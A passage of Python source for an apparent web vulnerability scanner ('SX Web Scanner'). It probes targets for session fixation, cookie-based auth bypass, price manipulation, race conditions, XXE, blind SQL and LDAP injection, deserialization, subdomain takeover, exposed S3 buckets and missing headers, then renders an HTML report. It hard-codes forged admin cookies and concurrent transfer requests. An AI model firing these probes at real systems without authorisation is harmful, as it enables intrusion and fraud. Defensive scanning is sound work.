                title="Session Fixation Vulnerability",
                severity="High",
                description="Session ID not regenerated after login",
                proof="Same session ID used before and after authentication",
                endpoint=login_url,
                technical_detail="Session identifier not changed upon authentication, allowing fixation attacks",
                remediation="Always regenerate session ID after successful authentication",
                cvss_score=7.4,
                category="Session Management"
            )
            vulns.append(vuln)
        
        return vulns

    async def test_cookie_forcing(self, target_url: str) -> List[Vulnerability]:
        vulns = []
        
        malicious_cookies = [
            ('admin', 'true'),
            ('role', 'administrator'),
            ('authenticated', 'yes'),
            ('user_id', '1'),
            ('is_admin', '1')
        ]
        
        for cookie_name, cookie_value in malicious_cookies:
            headers = {'Cookie': f'{cookie_name}={cookie_value}'}
            
            status, headers, text = await self._make_request(
                target_url,
                headers=headers
            )
            
            if status == 200 and any(indicator in text.lower() for indicator in ['admin', 'dashboard', 'settings']):
                vuln = Vulnerability(
                    title="Cookie Forcing Attack",
                    severity="High",
                    description="Authentication can be bypassed via cookie manipulation",
                    proof=f"Admin access with cookie: {cookie_name}={cookie_value}",
                    endpoint=target_url,
                    technical_detail="Application trusts client-supplied cookie values for authentication/authorization",
                    remediation="Never trust client-supplied authentication data, store session state server-side",
                    cvss_score=8.5,
                    category="Authentication"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_price_manipulation(self, cart_url: str, checkout_url: str) -> List[Vulnerability]:
        vulns = []
        
        price_tests = self.business_logic_payloads['price_manipulation']
        
        for price in price_tests:
            cart_data = {'item_id': '1', 'price': price}
            status, headers, text = await self._make_request(
                cart_url,
                method='POST',
                data=cart_data
            )
            
            checkout_data = {'total': price, 'items': ['1']}
            status, headers, text = await self._make_request(
                checkout_url,
                method='POST',
                data=checkout_data
            )
            
            if status == 200 and 'success' in text.lower():
                vuln = Vulnerability(
                    title="Price Manipulation Vulnerability",
                    severity="Critical",
                    description="Product prices can be manipulated client-side",
                    proof=f"Checkout successful with price: {price}",
                    endpoint=checkout_url,
                    technical_detail="Price validation performed client-side only, allowing manipulation",
                    remediation="Always validate prices server-side, use server-calculated totals, and implement digital signatures",
                    cvss_score=9.0,
                    category="Business Logic"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_race_condition(self, target_url: str) -> List[Vulnerability]:
        vulns = []
        
        race_data = {'action': 'transfer', 'amount': '100', 'from': 'A', 'to': 'B'}
        
        tasks = []
        for i in range(10):
            task = self._make_request(
                target_url,
                method='POST',
                data=race_data
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success_count = sum(1 for r in results if isinstance(r, tuple) and r[0] == 200)
        
        if success_count > 1:
            vuln = Vulnerability(
                title="Race Condition Vulnerability",
                severity="High",
                description="Race condition in concurrent operations",
                proof=f"{success_count} concurrent requests succeeded",
                endpoint=target_url,
                technical_detail="Lack of proper locking mechanism allows race conditions in concurrent operations",
                remediation="Implement database locking, use atomic operations, and add concurrency controls",
                cvss_score=7.8,
                category="Business Logic"
            )
            vulns.append(vuln)
        
        return vulns

    async def test_soap_api(self, soap_url: str) -> List[Vulnerability]:
        vulns = []
        
        soap_payloads = self.api_advanced_payloads['soap_injection']
        
        for payload in soap_payloads:
            headers = {
                'Content-Type': 'text/xml; charset=utf-8',
                'SOAPAction': '""'
            }
            
            soap_template = f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>{payload}</test>
  </soap:Body>
</soap:Envelope>'''
            
            status, headers, text = await self._make_request(
                soap_url,
                method='POST',
                data=soap_template,
                headers=headers
            )
            
            if 'root:' in text.lower() or 'etc/passwd' in text or 'XXE' in text:
                vuln = Vulnerability(
                    title="SOAP API XXE Injection",
                    severity="Critical",
                    description="XML External Entity injection in SOAP API",
                    proof=f"XXE successful with payload",
                    endpoint=soap_url,
                    technical_detail="SOAP parser resolves external entities without restriction",
                    remediation="Disable external entity resolution in XML parser, use secure SOAP libraries",
                    cvss_score=9.3,
                    category="API Security"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_blind_sql_injection(self, target_url: str, param: str) -> List[Vulnerability]:
        vulns = []
        
        payloads = self.db_advanced_payloads['blind_sql']
        
        for payload in payloads:
            start_time = time.time()
            
            test_url = f"{target_url}?{param}={payload}"
            status, headers, text = await self._make_request(test_url)
            
            elapsed = time.time() - start_time
            
            if elapsed > 4:
                vuln = Vulnerability(
                    title="Blind SQL Injection (Time-based)",
                    severity="Critical",
                    description="Time-based blind SQL injection detected",
                    proof=f"Delay of {elapsed:.2f}s with payload: {payload}",
                    endpoint=target_url,
                    technical_detail="Time delays in SQL queries indicate successful blind SQL injection",
                    remediation="Use parameterized queries, input validation, and Web Application Firewall",
                    cvss_score=9.0,
                    category="Injection"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_ldap_injection(self, ldap_url: str) -> List[Vulnerability]:
        vulns = []
        
        payloads = self.protocol_payloads['ldap']
        
        for payload in payloads:
            test_url = f"{ldap_url}?query={payload}"
            status, headers, text = await self._make_request(test_url)
            
            if 'invalid' not in text.lower() and 'error' not in text.lower():
                if 'admin' in text.lower() or 'password' in text.lower():
                    vuln = Vulnerability(
                        title="LDAP Injection",
                        severity="Critical",
                        description="LDAP injection possible",
                        proof=f"LDAP query manipulation successful: {payload}",
                        endpoint=ldap_url,
                        technical_detail="User input passed directly to LDAP queries without sanitization",
                        remediation="Use parameterized LDAP queries, input validation, escape special characters",
                        cvss_score=8.8,
                        category="Injection"
                    )
                    vulns.append(vuln)
                    break
        
        return vulns

    async def test_deserialization(self, target_url: str) -> List[Vulnerability]:
        vulns = []
        
        payloads = self.advanced_attack_payloads['deserialization']
        
        for payload in payloads:
            headers = {'Content-Type': 'application/java-serialized-object'}
            status, headers, text = await self._make_request(
                target_url,
                method='POST',
                data=payload,
                headers=headers
            )
            
            if status == 500 and any(word in text.lower() for word in ['serialization', 'deserialization', 'readobject', 'invoke']):
                vuln = Vulnerability(
                    title="Insecure Deserialization",
                    severity="Critical",
                    description="Insecure deserialization detected",
                    proof=f"Deserialization error with payload",
                    endpoint=target_url,
                    technical_detail="Application deserializes untrusted data without validation",
                    remediation="Avoid deserializing untrusted data, use safe serialization formats (JSON), implement integrity checks",
                    cvss_score=9.8,
                    category="Advanced Attacks"
                )
                vulns.append(vuln)
                break
        
        return vulns

    async def test_subdomain_takeover(self) -> List[Vulnerability]:
        vulns = []
        
        takeover_indicators = self.infrastructure_payloads['subdomain_takeover']
        
        for subdomain in self.discovered_subdomains:
            for indicator in takeover_indicators:
                if indicator in subdomain:
                    status, headers, text = await self._make_request(f"http://{subdomain}")
                    
                    error_messages = [
                        'NoSuchBucket', 'NoSuchKey',
                        '404 Not Found', 'The specified bucket does not exist',
                        'Repository not found', '404: Not Found'
                    ]
                    
                    for error in error_messages:
                        if error in text:
                            vuln = Vulnerability(
                                title="Subdomain Takeover Possible",
                                severity="High",
                                description=f"Subdomain {subdomain} may be vulnerable to takeover",
                                proof=f"Error message: {error}",
                                endpoint=subdomain,
                                technical_detail="DNS points to service that doesn't exist, allowing takeover",
                                remediation="Remove dangling DNS records, monitor subdomains, use CNAME scanning",
                                cvss_score=8.2,
                                category="Infrastructure"
                            )
                            vulns.append(vuln)
                            break
        
        return vulns

    async def test_aws_s3_buckets(self) -> List[Vulnerability]:
        vulns = []
        
        s3_patterns = self.cloud_payloads['aws_s3']
        
        for pattern in s3_patterns:
            test_url = f"https://{pattern}"
            status, headers, text = await self._make_request(test_url)
            
            if status == 200:
                sensitive_indicators = [
                    'aws_access_key', 'aws_secret_key',
                    'password', 'private_key',
                    'database', 'config'
                ]
                
                for indicator in sensitive_indicators:
                    if indicator in text.lower():
                        vuln = Vulnerability(
                            title="AWS S3 Bucket Exposure",
                            severity="Critical",
                            description="AWS S3 bucket exposed with sensitive data",
                            proof=f"Sensitive data in bucket: {pattern}",
                            endpoint=test_url,
                            technical_detail="S3 bucket misconfigured allowing public read access",
                            remediation="Set S3 bucket policies to private, enable encryption, use IAM roles",
                            cvss_score=9.5,
                            category="Cloud Security"
                        )
                        vulns.append(vuln)
                        break
        
        return vulns

    async def _detect_frameworks(self) -> Dict[str, Any]:
        findings = {
            'backend': [],
            'frontend': [],
            'cms': None,
            'database': [],
            'server': None
        }
        
        status, headers, text = await self._make_request(self.target_url)
        
        if 'server' in headers:
            findings['server'] = headers['server']
        
        if 'x-powered-by' in headers:
            powered_by = headers['x-powered-by'].lower()
            if 'php' in powered_by:
                findings['backend'].append('PHP')
            if 'asp.net' in powered_by:
                findings['backend'].append('ASP.NET')
        
        text_lower = text.lower()
        
        for framework, patterns in self.framework_patterns.items():
            for pattern in patterns:
                if pattern.lower() in text_lower:
                    if framework in ['WordPress', 'Drupal', 'Joomla']:
                        findings['cms'] = framework
                    elif framework in ['Vue.js', 'React', 'Angular']:
                        findings['frontend'].append(framework)
                    else:
                        findings['backend'].append(framework)
                    break
        
        db_patterns = {
            'MySQL': ['mysql_connect', 'mysqli', 'pdo_mysql'],
            'PostgreSQL': ['postgres', 'pg_connect'],
            'MongoDB': ['mongodb', 'mongoose'],
            'Redis': ['redis_connect', 'predis'],
            'SQLite': ['sqlite', '.db"', '.db\''],
            'Microsoft SQL Server': ['mssql', 'sqlsrv']
        }
        
        for db, patterns in db_patterns.items():
            for pattern in patterns:
                if pattern.lower() in text_lower:
                    findings['database'].append(db)
                    break
        
        return findings

    async def _analyze_headers(self, headers: Dict) -> List[Vulnerability]:
        vulns = []
        
        security_headers = {
            'Strict-Transport-Security': {
                'required': True,
                'severity': 'Medium',
                'description': 'Missing HSTS header',
                'remediation': 'Implement HSTS with max-age=31536000; includeSubDomains; preload'
            },
            'Content-Security-Policy': {
                'required': True,
                'severity': 'Medium',
                'description': 'Missing Content Security Policy',
                'remediation': 'Implement CSP to prevent XSS and data injection attacks'
            },
            'X-Frame-Options': {
                'required': True,
                'severity': 'Low',
                'description': 'Missing X-Frame-Options header',
                'remediation': 'Set X-Frame-Options: DENY or SAMEORIGIN'
            },
            'X-Content-Type-Options': {
                'required': True,
                'severity': 'Low',
                'description': 'Missing X-Content-Type-Options',
                'remediation': 'Set X-Content-Type-Options: nosniff'
            },
            'Referrer-Policy': {
                'required': False,
                'severity': 'Low',
                'description': 'Missing Referrer-Policy',
                'remediation': 'Set Referrer-Policy: strict-origin-when-cross-origin'
            }
        }
        
        for header, config in security_headers.items():
            if config['required'] and header not in headers:
                vuln = Vulnerability(
                    title=f"Missing Security Header: {header}",
                    severity=config['severity'],
                    description=config['description'],
                    proof=f"Header {header} not present in response",
                    endpoint=self.target_url,
                    technical_detail=f"Missing {header} security header exposes site to additional attack vectors",
                    remediation=config['remediation'],
                    cvss_score=3.5 if config['severity'] == 'Low' else 5.3,
                    category="Headers Security"
                )
                vulns.append(vuln)
        
        if 'server' in headers:
            server = headers['server'].lower()
            if any(old in server for old in ['apache/2.2', 'nginx/1.10', 'iis/7.0']):
                vuln = Vulnerability(
                    title="Outdated Server Version",
                    severity="Medium",
                    description=f"Outdated server version: {headers['server']}",
                    proof=f"Server header: {headers['server']}",
                    endpoint=self.target_url,
                    technical_detail="Older server versions may have known vulnerabilities",
                    remediation="Upgrade to latest stable version of web server",
                    cvss_score=5.9,
                    category="Information Disclosure"
                )
                vulns.append(vuln)
        
        return vulns

    async def test_gdpr_compliance(self, target_url: str) -> List[ComplianceCheck]:
        checks = []
        
        privacy_url = f"{target_url}/privacy"
        status, headers, text = await self._make_request(privacy_url)
        
        if status != 200:
            checks.append(ComplianceCheck(
                standard="GDPR",
                requirement="Privacy Policy accessible",
                test_procedure="Check privacy policy URL",
                result="FAIL",
                evidence="No privacy policy found",
                recommendation="Add accessible privacy policy"
            ))
        else:
            required_terms = ['data protection', 'right to access', 'right to erasure', 'data controller']
            missing_terms = []
            for term in required_terms:
                if term not in text.lower():
                    missing_terms.append(term)
            
            if missing_terms:
                checks.append(ComplianceCheck(
                    standard="GDPR",
                    requirement="Privacy Policy completeness",
                    test_procedure="Check for required GDPR terms",
                    result="FAIL",
                    evidence=f"Missing terms: {', '.join(missing_terms)}",
                    recommendation="Add missing GDPR requirements to privacy policy"
                ))
        
        cookie_check = await self._check_cookie_consent(target_url)
        if not cookie_check:
            checks.append(ComplianceCheck(
                standard="GDPR",
                requirement="Cookie consent mechanism",
                test_procedure="Check for cookie consent banner",
                result="FAIL",
                evidence="No cookie consent mechanism detected",
                recommendation="Implement GDPR-compliant cookie consent"
            ))
        
        return checks

    async def test_pci_dss_compliance(self, target_url: str) -> List[ComplianceCheck]:
        checks = []
        
        http_url = target_url.replace('https://', 'http://')
        status, headers, text = await self._make_request(http_url)
        
        if status != 301 and status != 308:
            checks.append(ComplianceCheck(
                standard="PCI DSS",
                requirement="HTTPS enforcement",
                test_procedure="Check HTTP to HTTPS redirect",
                result="FAIL",
                evidence="No HTTP to HTTPS redirect",
                recommendation="Implement permanent redirect from HTTP to HTTPS"
            ))
        
        tls_info = await self._check_tls_configuration(target_url)
        if tls_info.get('grade', 'F') in ['F', 'D', 'C']:
            checks.append(ComplianceCheck(
                standard="PCI DSS",
                requirement="Strong TLS configuration",
                test_procedure="Check TLS configuration",
                result="FAIL",
                evidence=f"TLS grade: {tls_info.get('grade')}",
                recommendation="Configure strong TLS: TLS 1.2+, secure ciphers, HSTS"
            ))
        
        return checks

    async def _check_cookie_consent(self, url: str) -> bool:
        status, headers, text = await self._make_request(url)
        
        consent_indicators = [
            'cookie consent', 'accept cookies', 'gdpr consent',
            'cookie banner', 'privacy settings'
        ]
        
        return any(indicator in text.lower() for indicator in consent_indicators)

    async def _check_tls_configuration(self, url: str) -> Dict:
        parsed = urlparse(url)
        hostname = parsed.netloc
        
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    return {
                        'tls_version': ssock.version(),
                        'cipher': cipher[0] if cipher else None,
                        'cert_expiry': cert.get('notAfter', ''),
                        'grade': self._grade_tls_config(ssock.version(), cipher)
                    }
        except:
            return {'grade': 'F'}

    def _grade_tls_config(self, tls_version: str, cipher) -> str:
        if not cipher:
            return 'F'
        
        cipher_name = cipher[0]
        
        if tls_version == 'TLSv1.3':
            version_score = 4
        elif tls_version == 'TLSv1.2':
            version_score = 3
        elif tls_version == 'TLSv1.1':
            version_score = 1
        else:
            version_score = 0
        
        weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT', 'MD5', 'SHA1']
        strong_ciphers = ['AES256-GCM', 'CHACHA20', 'AES128-GCM']
        
        cipher_score = 0
        if any(weak in cipher_name for weak in weak_ciphers):
            cipher_score = 0
        elif any(strong in cipher_name for strong in strong_ciphers):
            cipher_score = 3
        else:
            cipher_score = 2
        
        total = version_score + cipher_score
        
        if total >= 6:
            return 'A'
        elif total >= 4:
            return 'B'
        elif total >= 2:
            return 'C'
        elif total >= 1:
            return 'D'
        else:
            return 'F'

    async def _calculate_security_score(self) -> Tuple[int, str]:
        if not self.vulnerabilities:
            return 100, "Excellent"
        
        severity_weights = {
            'Critical': 25,
            'High': 15,
            'Medium': 8,
            'Low': 3,
            'Info': 1
        }
        
        total_deduction = 0
        severity_count = defaultdict(int)
        
        for vuln in self.vulnerabilities:
            deduction = severity_weights.get(vuln.severity, 0)
            total_deduction += deduction
            severity_count[vuln.severity] += 1
        
        total_deduction = min(total_deduction, 100)
        
        score = max(0, 100 - total_deduction)
        
        if score >= 90:
            risk_level = "Excellent"
        elif score >= 75:
            risk_level = "Good"
        elif score >= 50:
            risk_level = "Medium"
        elif score >= 25:
            risk_level = "Poor"
        else:
            risk_level = "Critical"
        
        self.results.information['severity_distribution'] = dict(severity_count)
        
        return score, risk_level

    async def scan(self, output_file: str = "sx_scan_report.html") -> Dict[str, Any]:
        print(f"Starting SX Web Scanner for: {self.target_url}")
        print("=" * 50)

        await self._initialize_session()
        
        try:
            print("Phase 1: Information Gathering")
            print("  Detecting CDN/WAF...")
            cdn_waf = await self._check_cdn_waf()
            self.results.information['cdn_waf'] = cdn_waf
            
            print("  Enumerating subdomains...")
            subdomains = await self._enumerate_subdomains()
            self.results.information['subdomains'] = subdomains
            
            print("  DNS enumeration...")
            dns_records = await self._dns_enumeration()
            self.results.information['dns_records'] = dns_records
            
            print("  Detecting frameworks...")
            frameworks = await self._detect_frameworks()
            self.results.information['frameworks'] = frameworks
            
            print("Phase 2: Network & Infrastructure")
            print("  Scanning ports...")
            port_results = await self._port_scan()
            self.results.information['open_ports'] = port_results
            
            print("Phase 3: Directory Enumeration")
            print("  Enumerating directories and files...")
            discovered_paths = await self._directory_enumeration()
            self.results.information['discovered_paths'] = discovered_paths
            
            print("Phase 4: Endpoint Discovery")
            print("  Crawling website...")
            endpoints = await self._crawl_for_endpoints()
            self.discovered_urls.update(endpoints)
            
            print("Phase 5: Vulnerability Testing")
            print("  Testing for SQL injection...")
            
            print("  Testing for XSS...")
            
            print("  Testing for path traversal...")
            await self._test_path_traversal()
            
            print("  Testing for command injection...")
            await self._test_command_injection()
            
            print("  Testing for NoSQL injection...")
            await self._test_nosql_injection()
            
            print("  Testing for SSTI...")
            await self._test_ssti()
            
            print("  Testing for XXE...")
            await self._test_xxe()
            
            print("  Testing for SSRF...")
            await self._test_ssrf()
            
            print("  Testing for IDOR...")
            await self._test_idor()
            
            print("  Testing for file upload vulnerabilities...")
            await self._test_file_upload()
            
            print("Phase 6: Security Header Analysis")
            status, headers, text = await self._make_request(self.target_url)
            header_vulns = await self._analyze_headers(headers)
            self.vulnerabilities.extend(header_vulns)
            
            print("Phase 7: Advanced Testing")
            if self.scan_config.enable_business_logic:
                print("  Testing business logic vulnerabilities...")
                auth_urls = self._find_auth_urls()
                for url in auth_urls[:3]:
                    await self.test_2fa_bypass(url)
                    await self.test_session_fixation(url)
            
            if self.scan_config.enable_api_fuzzing:
                print("  Testing API security...")
                api_urls = list(self.discovered_apis)[:3]
                for url in api_urls:
                    await self.test_soap_api(url)
            
            if self.scan_config.enable_infrastructure:
                print("  Testing infrastructure security...")
                await self.test_subdomain_takeover()
                await self.test_aws_s3_buckets()
            
            if self.scan_config.enable_compliance:
                print("  Testing compliance...")
                gdpr_checks = await self.test_gdpr_compliance(self.target_url)
                pci_checks = await self.test_pci_dss_compliance(self.target_url)
                self.compliance_checks.extend(gdpr_checks)
                self.compliance_checks.extend(pci_checks)
            
            print("Phase 8: Calculating Security Score")
            score, risk_level = await self._calculate_security_score()
            self.results.score = score
            self.results.risk_level = risk_level
            self.results.vulnerabilities = self.vulnerabilities
            
            print("Phase 9: Generating Report")
            html_report = await self._generate_html_report()
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_report)
            
            self.results.end_time = datetime.now().isoformat()
            self.scan_complete = True
            
            print("=" * 50)
            print(f"Scan completed!")
            print(f"Security Score: {score}/100 ({risk_level})")
            print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
            print(f"Report saved to: {output_file}")
            print("=" * 50)
            print(f"\n[DEBUG] Subdomains found: {len(subdomains)}")
            if subdomains:
                print("First 5 subdomains:")
                for sub in subdomains[:5]:
                    print(f"  - {sub}")
            
            print(f"\n[DEBUG] Before HTML generation:")
            print(f"  discovered_subdomains count: {len(self.discovered_subdomains)}")
            
            html_report = await self._generate_html_report()
            
            with open("debug_html.html", "w", encoding="utf-8") as f:
                f.write(html_report)
            print(f"Debug HTML saved to: debug_html.html")
            
            return {
                'target': self.target_url,
                'score': score,
                'risk_level': risk_level,
                'vulnerabilities_count': len(self.vulnerabilities),
                'report_file': output_file,
                'vulnerabilities': [
                    {
                        'title': v.title,
                        'severity': v.severity,
                        'endpoint': v.endpoint,
                        'cvss_score': v.cvss_score,
                        'category': v.category
                    }
                    for v in self.vulnerabilities
                ]
            }

        finally:
            await self._close_session()

    class EnhancedLogger:
        
        def __init__(self):
            import os
            from datetime import datetime
            self.log_file = f"logs/scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
        
        def info(self, message: str):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_msg = f"[INFO] {timestamp} - {message}"
            print(log_msg)
            self._write_log(log_msg)
        
        def warning(self, message: str):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_msg = f"[WARN] {timestamp} - {message}"
            print(log_msg)
            self._write_log(log_msg)
        
        def error(self, message: str):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_msg = f"[ERROR] {timestamp} - {message}"
            print(log_msg)
            self._write_log(log_msg)
        
        def _write_log(self, message: str):
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(message + '\n')

    class RateLimitDetector:
        
        def __init__(self):
            self.detected = False
            self.patterns = []
        
        def analyze_response(self, status: int, headers: Dict, response_time: float) -> bool:
            if status == 429:
                self.detected = True
                return True
            
            rate_limit_headers = ['x-ratelimit-remaining', 'x-ratelimit-limit', 'retry-after']
            if any(h in headers for h in rate_limit_headers):
                self.detected = True
                return True
            
            return False

    class EnhancedErrorHandler:
        
        def __init__(self):
            self.errors = []
            self.error_count = 0
        
        async def handle_request_error(self, error: Exception, url: str, context: str = ""):
            self.error_count += 1
            error_info = {
                'timestamp': datetime.now().isoformat(),
                'url': url,
                'context': context,
                'error_type': type(error).__name__,
                'error_message': str(error)
            }
            self.errors.append(error_info)
            
            if self.error_count % 10 == 0:
                print(f"Warning: {self.error_count} errors encountered so far")

    def _find_auth_urls(self) -> List[str]:
        auth_keywords = ['login', 'auth', 'signin', 'register', 'password', 'reset', 'logout']
        return [url for url in self.discovered_urls 
                if any(keyword in url.lower() for keyword in auth_keywords)]

    def _load_ml_models(self):
        print("Loading machine learning models...")
        pass

    def _load_threat_intelligence(self):
        print("Loading threat intelligence...")
        pass

    def _reduce_false_positives(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        filtered_vulns = []
        
        for vuln in vulns:
            proof_lower = vuln.proof.lower()
            
            weak_indicators = [
                'might be', 'could be', 'possibly',
                'potential', 'may have', 'seems to'
            ]
            
            if any(indicator in proof_lower for indicator in weak_indicators):
                continue
            
            filtered_vulns.append(vuln)
        
        return filtered_vulns

    def _manage_resources(self):
        process = psutil.Process()
        memory_usage = process.memory_info().rss / 1024 / 1024
        
        if memory_usage > 500:
            self.logger.warning(f"High memory usage: {memory_usage}MB")
            
            if hasattr(self, 'session') and self.session:
                import asyncio
                asyncio.create_task(self.session.close())
                self.session = None
            
            import gc
            gc.collect()

    async def _generate_html_report(self) -> str:
        total_vulns = len(self.vulnerabilities)
        by_severity = defaultdict(int)
        by_category = defaultdict(int)
        
        for vuln in self.vulnerabilities:
            by_severity[vuln.severity] += 1
            by_category[vuln.category] += 1
        
        html = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SX Web Scanner Report - {self.base_domain}</title>
    <style>
        :root {{
            --primary: #0f62fe;
            --primary-dark: #0043ce;
            --secondary: #6f6f6f;
            --danger: #da1e28;
            --warning: #ff832b;
            --success: #24a148;
            --info: #1192e8;
            --dark: #161616;
            --darker: #0a0a0a;
            --light: #f4f4f4;
            --lighter: #ffffff;
            --border: #393939;
            --card-bg: #262626;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: var(--darker);
            color: var(--lighter);
            line-height: 1.6;
            padding: 20px;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        
        .header {{
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(135deg, var(--dark) 0%, var(--darker) 100%);
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
            position: relative;
            overflow: hidden;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary) 0%, var(--info) 100%);
        }}
        
        .scanner-title {{
            font-family: 'Courier New', monospace;
            font-size: 2.8rem;
            font-weight: 700;
            background: linear-gradient(90deg, var(--primary) 0%, var(--info) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }}
        
        .target-url {{
            font-size: 1.2rem;
            color: var(--lighter);
            background: var(--card-bg);
            padding: 12px 24px;
            border-radius: 8px;
            display: inline-block;
            margin: 15px 0;
            border: 1px solid var(--border);
            font-family: monospace;
            word-break: break-all;
        }}
        
        .score-display {{
            font-size: 5rem;
            font-weight: 800;
            margin: 20px 0;
        }}
        
        .score-excellent {{ color: var(--success); }}
        .score-good {{ color: #a7f542; }}
        .score-medium {{ color: var(--warning); }}
        .score-poor {{ color: #ff6b6b; }}
        .score-critical {{ color: var(--danger); }}
        
        .risk-level {{
            font-size: 1.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
        }}
        
        .summary-cards {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .card {{
            background: var(--card-bg);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid var(--border);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }}
        
        .card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }}
        
        .card-title {{
            font-size: 1rem;
            color: var(--secondary);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .card-value {{
            font-size: 2.5rem;
            font-weight: 700;
        }}
        
        .severity-critical {{ color: var(--danger); }}
        .severity-high {{ color: #ff6b6b; }}
        .severity-medium {{ color: var(--warning); }}
        .severity-low {{ color: #a7f542; }}
        .severity-info {{ color: var(--info); }}
        
        .vulnerability-section {{
            margin: 40px 0;
        }}
        
        .section-title {{
            font-size: 1.8rem;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--border);
            color: var(--lighter);
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .vulnerability-list {{
            display: grid;
            gap: 15px;
        }}
        
        .vulnerability-item {{
            background: var(--card-bg);
            border-radius: 10px;
            padding: 0;
            border: 1px solid var(--border);
            overflow: hidden;
            transition: all 0.3s ease;
        }}
        
        .vulnerability-item:hover {{
            border-color: var(--primary);
        }}
        
        .vuln-header {{
            padding: 20px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 15px;
        }}
        
        .vuln-title {{
            font-size: 1.2rem;
            font-weight: 600;
            flex: 1;
        }}
        
        .severity-badge {{
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        
        .severity-critical-bg {{ background: var(--danger); color: white; }}
        .severity-high-bg {{ background: #ff6b6b; color: white; }}
        .severity-medium-bg {{ background: var(--warning); color: white; }}
        .severity-low-bg {{ background: #a7f542; color: var(--dark); }}
        .severity-info-bg {{ background: var(--info); color: white; }}
        
        .vuln-content {{
            padding: 0 20px 20px 20px;
            display: none;
            border-top: 1px solid var(--border);
            margin-top: -1px;
        }}
        
        .vuln-content.active {{
            display: block;
            animation: fadeIn 0.3s ease;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(-10px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .vuln-detail {{
            margin: 15px 0;
        }}
        
        .detail-label {{
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 5px;
            display: block;
        }}
        
        .detail-value {{
            background: var(--dark);
            padding: 12px;
            border-radius: 6px;
            border: 1px solid var(--border);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            word-break: break-all;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 50px;
            padding: 30px;
            color: var(--secondary);
            font-size: 0.9rem;
            border-top: 1px solid var(--border);
        }}
        
        .timestamp {{
            margin-top: 10px;
            font-size: 0.8rem;
            color: #666;
        }}
        
        .chart-container {{
            background: var(--card-bg);
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
            border: 1px solid var(--border);
        }}
        
        .no-vulns {{
            text-align: center;
            padding: 50px;
            color: var(--success);
            font-size: 1.5rem;
        }}
        
        @media (max-width: 768px) {{
            .scanner-title {{ font-size: 2rem; }}
            .score-display {{ font-size: 3.5rem; }}
            .summary-cards {{ grid-template-columns: 1fr; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="scanner-title">SX WEB SCANNER</div>
            <div style="color: var(--secondary); margin-bottom: 20px;">Professional Security Assessment Report</div>
            
            <div class="target-url">{self.target_url}</div>
            
            <div class="score-display {self._get_score_class(self.results.score)}">{self.results.score}/100</div>
            <div class="risk-level">{self.results.risk_level}</div>
            
            <div style="margin-top: 20px; color: var(--secondary);">
                Scan completed: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
        </div>
        
        <div class="summary-cards">
            <div class="card">
                <div class="card-title">Total Vulnerabilities</div>
                <div class="card-value">{total_vulns}</div>
            </div>
            
            <div class="card">
                <div class="card-title">Critical</div>
                <div class="card-value severity-critical">{by_severity.get('Critical', 0)}</div>
            </div>
            
            <div class="card">
                <div class="card-title">High</div>
                <div class="card-value severity-high">{by_severity.get('High', 0)}</div>
            </div>
            
            <div class="card">
                <div class="card-title">Medium</div>
                <div class="card-value severity-medium">{by_severity.get('Medium', 0)}</div>
            </div>
            
            <div class="card">
                <div class="card-title">Low</div>
